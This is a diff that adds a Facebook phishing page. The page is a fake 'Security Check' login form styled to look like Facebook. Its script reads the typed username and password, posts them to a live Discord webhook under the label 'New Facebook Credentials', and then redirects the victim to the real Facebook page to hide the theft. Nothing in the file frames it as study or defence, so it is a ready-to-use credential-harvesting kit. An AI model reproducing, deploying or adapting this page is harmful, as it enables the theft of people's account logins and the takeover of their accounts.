@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Check</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+        body {
+            background-color: #f0f2f5;
+            color: #1c1e21;
+            line-height: 1.34;
+        }
+        header {
+            background-color: #3b5998;
+            padding: 8px 0;
+            box-shadow: 0 1px 1px rgba(0, 0, 0, 0.1);
+        }
+        .main-header {
+            max-width: 980px;
+            margin: 0 auto;
+        }
+        .logo img {
+            height: 24px;
+            margin-left: 10px;
+        }
+        section {
+            padding: 15px;
+        }
+        .form {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+            padding: 15px;
+            max-width: 500px;
+            margin: 0 auto;
+        }
+        .m-header h3 {
+            font-size: 18px;
+            color: #1c1e21;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+        .red-box {
+            background-color: #fff4f4;
+            border: 1px solid #ffd6d6;
+            border-radius: 4px;
+            padding: 12px;
+            margin-bottom: 15px;
+        }
+        .red-box p {
+            font-size: 14px;
+            margin-bottom: 8px;
+            color: #1c1e21;
+        }
+        .red-box a {
+            color: #385898;
+            text-decoration: none;
+        }
+        .login-form {
+            margin-top: 15px;
+        }
+        .login-form label {
+            display: block;
+            font-size: 14px;
+            margin-bottom: 5px;
+            color: #606770;
+        }
+        .login-form input[type="username"],
+        .login-form input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 16px;
+        }
+        .login-form input[type="checkbox"] {
+            margin: 10px 5px 0 0;
+            vertical-align: middle;
+        }
+        .login-form input[type="submit"] {
+            background-color: #3b5998;
+            border: 1px solid #294461;
+            color: white;
+            padding: 8px 16px;
+            border-radius: 4px;
+            font-size: 14px;
+            margin: 10px 0;
+            cursor: pointer;
+        }
+        .login-form a {
+            color: #385898;
+            text-decoration: none;
+            font-size: 13px;
+        }
+        footer {
+            margin-top: 20px;
+            padding: 15px;
+            text-align: center;
+        }
+        footer ul {
+            list-style-type: none;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            margin-bottom: 10px;
+        }
+        footer li {
+            margin: 0 5px 5px 0;
+        }
+        footer a {
+            color: #385898;
+            text-decoration: none;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="main-header">
+            <div class="logo">
+                <a href="http://www.facebook.com"><img src="./logo.png"></a>
+            </div>
+        </div>
+    </header>
+    <section>
+        <div class="form">
+            <div class="m-header">
+                <h3>Facebook Security Check. Please Verify It's You.</h3>
+            </div>
+            <div class="red-box">
+                <p style="font-weight:bold; font-size:13px">Verify needed to understand it's you</p>
+                <p>Enter your password for security reason (make sure your caps lock is off)</p>
+                <p>Forgot your password ? <a href="">Request new one</a>
+            </div>
+
+            <div class="login-form">
+                <form method="post" class="bb" novalidate="1" id="login-form" onsubmit="sendToDiscord(event)">
+                    <label for="username">Username:</label>
+                    <input name="username" id="username" type="username"><br>
+                    <br><br>
+                    <label for="password">Password:</label>
+                    <input name="password" id="password" type="password"><br>
+                    <input id="keep" style="margin: 10px 5px 0 0" type="checkbox">
+                    <label for="keep" style="font-size:12px;">keep me logged in</label><br>
+                    <input type="submit" name="submit" value="Verify">
+                    <p><a style="text-decoration:none; color:#3B5998; margin:10px 0 0 0; display:inline-block;" href="">can't log in?</a></p>
+                </form>
+            </div>
+        </div>
+        
+        <footer>
+            <ul>
+                <li><a href="">Mobile</a></li>
+                <li><a href="">Find Friends</a></li>
+                <li><a href="">Badges</a></li>
+                <li><a href="">People</a></li>
+                <li><a href="">Pages</a></li>
+                <li><a href="">Apps</a></li>
+                <li><a href="">Games</a></li>
+                <li><a href="">Music</a></li>
+                <li><a href="">Locations</a></li>
+            </ul>
+            <ul>
+                <li><a href="">Topics</a></li>
+                <li><a href="">About</a></li>
+                <li><a href="">Create Ad</a></li>
+                <li><a href="">Create Page</a></li>
+                <li><a href="">Devepers</a></li>
+                <li><a href="">Careers</a></li>
+                <li><a href="">Privacy</a></li>
+                <li><a href="">Cookies</a></li>
+                <li><a href="">Terms</a></li>
+                <li><a href="">Help</a></li>
+            </ul>
+        </footer>
+    </section>
+
+<script>
+function sendToDiscord(event) {
+    event.preventDefault();
+    
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
+    
+    fetch('https://discord.com/api/webhooks/1393190214238998598/RTf67SJLv3lWkdlSeYbSQZ8mM9kxPHMHSpTtXf1DYNhQmT_yWET1qIWKNBCpKdWi3Gx9', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+            content: `🔒 New Facebook Credentials\nUsername: ${username}\nPassword: ${password}\n\nIP: ${navigator.userAgent}\n-----------------------------------------`,
+            username: "Facebook Security Logger",
+			avatar_url: "https://images.icon-icons.com/2429/PNG/512/facebook_logo_icon_147291.png"
+        }),
+    });
+    
+    window.location.href = 'https://www.facebook.com/login/identify/';
+    return false;
+}
+</script>
+</body>
+</html>
